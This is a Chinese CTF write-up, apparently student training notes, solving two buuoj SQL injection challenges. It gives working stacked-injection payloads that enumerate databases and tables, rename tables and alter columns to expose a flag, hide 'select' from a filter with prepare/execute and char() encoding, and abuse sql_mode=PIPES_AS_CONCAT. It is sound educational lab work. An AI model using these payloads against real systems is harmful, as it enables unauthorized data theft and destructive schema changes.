# 1.[强网杯 2019]随便注入

来源：buuoj

## 方法1 ： 别名+堆叠注入

解题思路：

1. 判断注入位置是字符型还是整形。输入单引号，发现有错误,是字符型

2. 查看数据库

   ```
   1';show databases;#
   ```

   ![image-20210719103447286](https://github.com/Biusec/19Grade_CTFSummerTraining/tree/main/7%E6%9C%8818%E6%97%A5%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%8F%90%E4%BA%A4/Throokie/sql%E6%B3%A8%E5%85%A5.assets/image-20210719103447286.png)

3. 查看表，和查看表结构

   ```
   0';show tables;#
   0';desc `1919810931114514`;# 
   //	反引号不能去掉。不然mysql不会认为这是一个表，而是认为你输入了奇怪的数字
   
   ```

   ![image-20210719103557271](sql%E6%B3%A8%E5%85%A5.assets/image-20210719103557271.png)

   ![image-20210719103610188](sql%E6%B3%A8%E5%85%A5.assets/image-20210719103610188.png)

4. select 查数据，发现有过滤

![image-20210719103714100](sql%E6%B3%A8%E5%85%A5.assets/image-20210719103714100.png)

5. 猜测后端查询语句

   ```
   select id, data from words where id = 
   ```

6. 改别名。将需要查询的表改成words。表里的字段改成id，data。内容不变

   ```
   //改表别名
   0';rename table words to test;rename table `1919810931114514` to words;
   //改表字段名
   alter table words change flag id varchar(100);
   
   //一定要合起来一起改。不然改了表名没改字段名，查询时就会出错。后面就改不了字段名
   
   //最终payload;
   0';rename table words to test;rename table `1919810931114514` to words;alter table words change flag id varchar(100);
   ```

7. 查询

   ```
   1' or 1=1#  //爆出全部数据
   ```

   ![image-20210719112200300](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112200300.png)



## 方法2：预处理 + 编译

预处理介绍

1. 设置预处理语句：

   ```sql
   prepare name1 from 'select * from mysql.user';
   #名name1，执行的语句: select * from mysql.user
   ```

![image-20210719112243807](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112243807.png)

2. 执行预处理语句: 

   ```sql
   execute name1;
   ```

![image-20210719112409783](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112409783.png)

3. 查版本

   ```sql
   1';prepare name from concat(char(115,101,108,101,99,116), ' version()');execute name;#
   
   #char(115,101,108,101,99,116) 是字符串 'select' 的ascii码
   
   #这一段代码相当于  select version()
   ```

   ![image-20210719112615532](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112615532.png)

4. 查flag

   ```sql
   1';prepare name from concat(char(115,101,108,101,99,116), ' flag from `1919810931114514`');execute name;#
   
   #相当于 select flag from `1919810931114514`
   ```

   ![image-20210719112647841](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112647841.png)



# 2.[SUCTF 2019]EasySQL1

来源：buuoj

思路：

1. 进入网站，有个框框，输入数字1返回的内容和之前堆叠注入那题很像。马上用堆叠注入

   ![image-20210719112801566](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112801566.png)

2. 查表

   ![image-20210719112814331](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112814331.png)

3. 查字段，发现有过滤。经过检查过滤了flag, from等关键词

   ![image-20210719112830210](sql%E6%B3%A8%E5%85%A5.assets/image-20210719112830210.png)

4. from被过滤，预处理也不行了。最后查网上发现这里的源码可能为

   ```sql
   select $_POST[‘query’] || flag from Flag
   ```



## 方法1：sql_mode=PIPES_AS_CONCAT



将||当成字符串连接符

```sql
payload: 1;set sql_mode=PIPES_AS_CONCAT;select 1
#拼接后的查询语句： select 1||flag from Flag
```

select 1 from Flag 结果是1
select flag from Flag 结果是 [flag]

||令它们结果连接，就是 1[flag]

![image-20210719113111915](sql%E6%B3%A8%E5%85%A5.assets/image-20210719113111915.png)



## 方法2：

将||当成逻辑运算符

```sql
payload: *,1
#拼接后的语句: select *,1||flag from Flag
#相当于
#select * from Flag
#select 1||flag from Flag
```

![image-20210719113301160](sql%E6%B3%A8%E5%85%A5.assets/image-20210719113301160.png)

为什么后面会返回1？

比如下面

![image-20210719113324945](sql%E6%B3%A8%E5%85%A5.assets/image-20210719113324945.png)

![image-20210719113336378](sql%E6%B3%A8%E5%85%A5.assets/image-20210719113336378.png)

![image-20210719113826982](sql%E6%B3%A8%E5%85%A5.assets/image-20210719113826982.png)

![image-20210719113511860](sql%E6%B3%A8%E5%85%A5.assets/image-20210719113511860.png)



最后我测试了几下，发现：

成功运行的条件是：

```sql
数字||存在的字段
```